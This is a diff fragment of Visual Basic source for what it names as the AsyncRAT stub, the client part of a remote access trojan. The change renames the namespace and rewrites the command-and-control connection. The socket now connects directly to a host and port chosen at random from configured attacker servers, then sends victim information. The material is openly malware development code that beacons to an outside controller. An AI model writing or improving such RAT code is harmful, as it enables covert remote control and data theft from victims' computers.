@@ -24,7 +24,7 @@ Imports System.Drawing.Imaging
 '%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
 '%ASSEMBLY%<Assembly: Guid("%Guid%")>
 
-Namespace Stub
+Namespace AsyncRAT_Stub
 
     Public Class Main
 
@@ -73,9 +73,6 @@ Namespace Stub
                 Threading.Thread.Sleep(2500)
                 S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
-                Dim ipAddress As IPAddress() = Dns.GetHostAddresses(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)))
-                Dim ipEndPoint As IPEndPoint = New IPEndPoint(CType(ipAddress(0), IPAddress), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
-
                 BufferLength = -1
                 Buffer = New Byte(0) {}
                 MS = New MemoryStream
@@ -83,7 +80,7 @@ Namespace Stub
                 S.ReceiveBufferSize = 1024 * 50
                 S.SendBufferSize = 1024 * 50
 
-                S.Connect(ipEndPoint)
+                S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
 
                 isConnected = True
                 Send(Info)
